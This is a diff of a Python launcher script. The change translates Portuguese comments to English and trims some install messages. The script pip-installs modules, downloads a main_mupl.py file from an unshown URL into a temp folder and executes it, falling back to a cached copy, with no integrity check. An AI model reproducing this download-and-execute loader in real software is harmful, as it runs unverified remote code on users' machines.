@@ -1,7 +1,6 @@
 import os
 import tempfile
 import subprocess
-import requests
 
 def install_modules():
     required_modules = [
@@ -16,17 +15,14 @@ def install_modules():
 
     for module in required_modules:
         try:
-            if module == 'pywin32':
-                __import__('win32api')
-            elif module == 'Pillow':
+            if module == 'Pillow':
                 __import__('PIL')
             else:
                 __import__(module)
         except ImportError:
-            print(f"Módulo {module} não encontrado. Instalando...")
             subprocess.run(['pip', 'install', module])
 
-    # Limpar o terminal de acordo com o sistema operacional
+    # Clear the terminal according to the operating system
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def download_and_execute():
@@ -36,7 +32,7 @@ def download_and_execute():
     main_py_path = os.path.join(temp_dir, main_py_filename)
     folder_executed = os.getcwd()
 
-    # Baixar o arquivo main_mupl.py
+    # Download the main_mupl.py file
     try:
         response = requests.get(main_py_url)
         if response.status_code == 200:
@@ -45,27 +41,28 @@ def download_and_execute():
 
             command = ['python', main_py_path, folder_executed] if os.name == 'nt' else ['python3', main_py_path, folder_executed]
 
-            # Executar o subprocesso corretamente
+            # Execute the subprocess correctly
             subprocess.run(command)
             
         else:
             if os.path.exists(main_py_path):
                 command = ['python', main_py_path, folder_executed] if os.name == 'nt' else ['python3', main_py_path, folder_executed]
 
-                # Executar o subprocesso corretamente
+                # Execute the subprocess correctly
                 subprocess.run(command)
 
     except Exception as e:
         if os.path.exists(main_py_path):
             command = ['python', main_py_path, folder_executed] if os.name == 'nt' else ['python3', main_py_path, folder_executed]
 
-            # Executar o subprocesso corretamente
+            # Execute the subprocess correctly
             subprocess.run(command)
             
         else:
-            print(f"Erro durante o download ou execução: {e}")
+            print(f"Error during download or execution: {e}")
 
 
 if __name__ == "__main__":
     install_modules()
+    import requests
     download_and_execute()
